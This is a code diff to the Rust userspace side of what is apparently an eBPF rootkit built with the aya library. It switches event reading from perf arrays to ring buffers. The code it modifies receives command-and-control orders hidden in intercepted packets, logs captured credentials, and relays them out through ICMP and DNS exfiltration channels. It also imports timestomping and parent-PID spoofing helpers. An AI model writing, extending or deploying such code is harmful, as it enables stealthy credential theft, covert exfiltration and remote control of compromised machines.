@@ -1,7 +1,7 @@
 use anyhow::{Context, Result};
 use aya::{
     include_bytes_aligned,
-    maps::{AsyncPerfEventArray, HashMap, MapData},
+    maps::{HashMap, MapData, RingBuf},
     programs::{
         tc::{SchedClassifier, TcAttachType},
         KProbe, TracePoint, Xdp, XdpFlags,
@@ -9,7 +9,6 @@ use aya::{
     Btf, Ebpf,
 };
 use aya_log::EbpfLogger;
-use bytes::BytesMut;
 use clap::Parser;
 use common::{
     CredentialCapture, DnsExfilChunk, EventHeader, IcmpExfilPayload, RootkitConfig, TimestompEntry,
@@ -23,9 +22,11 @@ use common::{
 use tracing::{debug, error, info, warn};
 use offense::{parse_spoof_ppid, parse_timestomp, parse_tty_device};
 use std::fs;
+use std::os::fd::AsRawFd;
 use std::path::Path;
 use std::sync::atomic::{AtomicU32, Ordering};
 use std::sync::{Arc, Mutex};
+use tokio::io::unix::AsyncFd;
 use tokio::signal;
 use tokio::sync::watch;
 
@@ -638,10 +639,10 @@ async fn monitor_events(
             return;
         }
     };
-    let mut events: AsyncPerfEventArray<_> = match AsyncPerfEventArray::try_from(events_map) {
-        Ok(perf) => perf,
+    let events_ring = match RingBuf::try_from(events_map) {
+        Ok(rb) => rb,
         Err(e) => {
-            error!("Failed to get EVENTS perf array: {}", e);
+            error!("Failed to create EVENTS ring buffer: {}", e);
             return;
         }
     };
@@ -653,100 +654,86 @@ async fn monitor_events(
             return;
         }
     };
-    let mut cred_events: AsyncPerfEventArray<_> = match AsyncPerfEventArray::try_from(cred_map) {
-        Ok(perf) => perf,
+    let cred_ring = match RingBuf::try_from(cred_map) {
+        Ok(rb) => rb,
         Err(e) => {
-            error!("Failed to get CRED_EVENTS perf array: {}", e);
+            error!("Failed to create CRED_EVENTS ring buffer: {}", e);
             return;
         }
     };
 
-    let cpus = aya::util::online_cpus().unwrap_or_else(|_| vec![0]);
-    info!("Event monitoring started on {} CPUs", cpus.len());
+    info!("Event monitoring started (ring buffer mode)");
 
     let dns_seq = Arc::new(AtomicU32::new(0));
 
-    for cpu in cpus.iter() {
-        if let Ok(buf) = events.open(*cpu, None) {
-            let maps = Arc::clone(&c2_maps);
-            let kill = kill_tx.clone();
-            tokio::spawn(async move {
-                process_event_buf(buf, maps, kill).await;
-            });
+    let mut events_fd = match AsyncFd::new(events_ring) {
+        Ok(fd) => fd,
+        Err(e) => {
+            error!("Failed to create AsyncFd for EVENTS: {}", e);
+            return;
         }
-        if let Ok(buf) = cred_events.open(*cpu, None) {
-            let icmp_q = icmp_queue.clone();
-            let dns_q = dns_queue.clone();
-            let do_relay = cred_relay;
-            let seq = Arc::clone(&dns_seq);
-            tokio::spawn(async move {
-                process_cred_buf(buf, do_relay, icmp_q, dns_q, seq).await;
-            });
-        }
-    }
-}
+    };
 
-async fn process_event_buf(
-    mut buf: aya::maps::perf::AsyncPerfEventArrayBuffer<aya::maps::MapData>,
-    c2_maps: Arc<C2Maps>,
-    kill_tx: watch::Sender<bool>,
-) {
-    let mut bufs = (0..10)
-        .map(|_| BytesMut::with_capacity(1024))
-        .collect::<Vec<_>>();
-    loop {
-        let events = match buf.read_events(&mut bufs).await {
-            Ok(events) => events,
-            Err(e) => {
-                error!("Error reading events: {}", e);
-                return;
-            }
-        };
-        for buf in bufs.iter().take(events.read) {
-            if buf.len() >= std::mem::size_of::<EventHeader>() {
-                let event = unsafe { std::ptr::read_unaligned(buf.as_ptr() as *const EventHeader) };
-                if event.event_type == EVENT_PACKET_INTERCEPTED {
-                    let cmd_type = event.pid;
-                    let arg = event.context;
-                    dispatch_c2_command(cmd_type, arg, &c2_maps, &kill_tx);
-                } else {
-                    log_event(&event);
+    let mut cred_fd = match AsyncFd::new(cred_ring) {
+        Ok(fd) => fd,
+        Err(e) => {
+            error!("Failed to create AsyncFd for CRED_EVENTS: {}", e);
+            return;
+        }
+    };
+
+    tokio::spawn(async move {
+        loop {
+            let mut guard = match events_fd.readable_mut().await {
+                Ok(g) => g,
+                Err(e) => {
+                    error!("EVENTS readable error: {}", e);
+                    return;
+                }
+            };
+            let rb = guard.get_inner_mut();
+            while let Some(item) = rb.next() {
+                if item.len() >= std::mem::size_of::<EventHeader>() {
+                    let event =
+                        unsafe { std::ptr::read_unaligned(item.as_ptr() as *const EventHeader) };
+                    if event.event_type == EVENT_PACKET_INTERCEPTED {
+                        let cmd_type = event.pid;
+                        let arg = event.context;
+                        dispatch_c2_command(cmd_type, arg, &c2_maps, &kill_tx);
+                    } else {
+                        log_event(&event);
+                    }
                 }
             }
+            guard.clear_ready();
         }
-    }
-}
+    });
 
-async fn process_cred_buf(
-    mut buf: aya::maps::perf::AsyncPerfEventArrayBuffer<aya::maps::MapData>,
-    cred_relay: bool,
-    icmp_queue: Option<Arc<Mutex<HashMap<MapData, u32, IcmpExfilPayload>>>>,
-    dns_queue: Option<Arc<Mutex<HashMap<MapData, u32, DnsExfilChunk>>>>,
-    dns_seq: Arc<AtomicU32>,
-) {
-    let mut bufs = (0..10)
-        .map(|_| BytesMut::with_capacity(1024))
-        .collect::<Vec<_>>();
-    loop {
-        let events = match buf.read_events(&mut bufs).await {
-            Ok(events) => events,
-            Err(e) => {
-                error!("Error reading cred events: {}", e);
-                return;
-            }
-        };
-        for buf in bufs.iter().take(events.read) {
-            if buf.len() >= std::mem::size_of::<CredentialCapture>() {
-                let capture =
-                    unsafe { std::ptr::read_unaligned(buf.as_ptr() as *const CredentialCapture) };
-                log_credential_capture(&capture);
-                if cred_relay {
-                    relay_credential_to_icmp(&capture, &icmp_queue);
-                    relay_credential_to_dns(&capture, &dns_queue, &dns_seq);
+    tokio::spawn(async move {
+        loop {
+            let mut guard = match cred_fd.readable_mut().await {
+                Ok(g) => g,
+                Err(e) => {
+                    error!("CRED_EVENTS readable error: {}", e);
+                    return;
+                }
+            };
+            let rb = guard.get_inner_mut();
+            while let Some(item) = rb.next() {
+                if item.len() >= std::mem::size_of::<CredentialCapture>() {
+                    let capture = unsafe {
+                        std::ptr::read_unaligned(item.as_ptr() as *const CredentialCapture)
+                    };
+                    log_credential_capture(&capture);
+                    if cred_relay {
+                        relay_credential_to_icmp(&capture, &icmp_queue);
+                        relay_credential_to_dns(&capture, &dns_queue, &dns_seq);
+                    }
                 }
             }
+            guard.clear_ready();
         }
-    }
+    });
 }
 
 fn dispatch_c2_command(cmd_type: u32, arg: u64, c2_maps: &C2Maps, kill_tx: &watch::Sender<bool>) {
